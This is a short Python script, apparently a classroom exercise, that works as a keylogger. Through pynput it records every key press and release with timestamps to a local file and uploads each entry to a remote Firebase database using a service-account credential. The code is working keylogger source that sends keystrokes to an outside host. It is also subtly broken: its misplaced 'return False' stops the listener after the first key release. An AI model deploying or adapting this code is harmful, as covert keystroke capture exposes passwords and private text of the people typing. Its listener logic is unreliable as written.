### Versão Firebase 
from pynput import keyboard
import firebase_admin
from firebase_admin import credentials,db
import datetime

logNumber = 0 

cred = credentials.Certificate("/Users/goncalobraga/Desktop/FACULDADE/SI/Sensorização e Ambiente/Aula2/sistemasinteligentes-sa-firebase-adminsdk-i9zeb-7ccd2cdf17.json")
firebase_admin.initialize_app(cred,{"databaseURL":"https://sistemasinteligentes-sa-default-rtdb.firebaseio.com/"})

ref = db.reference("/")

f = open('loggerKeyboard.txt', 'a') 
def get_current_time():
    now = datetime.datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

#detect key press
def on_press(key):
    global logNumber
    try:
        print('alphanumeric key {0} pressed'.format(str(key.char)))
        log = get_current_time() + '|' + "AlphaNumeric Key Pressed" + '|' + str(key.char) + '\n'
        f.write(log)
        logKey = "Log_"+ str(logNumber)
        logNumber += 1
        db.reference("/").update({logKey:log})
    except:
        print('special key {0} pressed'.format(str(key)))
        log = get_current_time() + '|' + "Special Key Pressed" + '|' + str(key) + '\n'
        f.write(log)
        logKey = "Log_"+ str(logNumber)
        logNumber += 1
        db.reference("/").update({logKey:log})

#detect key releases
def on_release(key):
    global logNumber
    print('{0} released'.format(str(key)))
    log = get_current_time() + '|' + "Key Released" + '|' + str(key) + '\n'
    f.write(log)
    logKey = "Log_"+ str(logNumber)
    logNumber += 1
    db.reference("/").update({logKey:log})
    if key == keyboard.Key.esc:
    #stop listener
        print('Gracefully Stopping!')
    return False

#collecting events
with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()

f.close()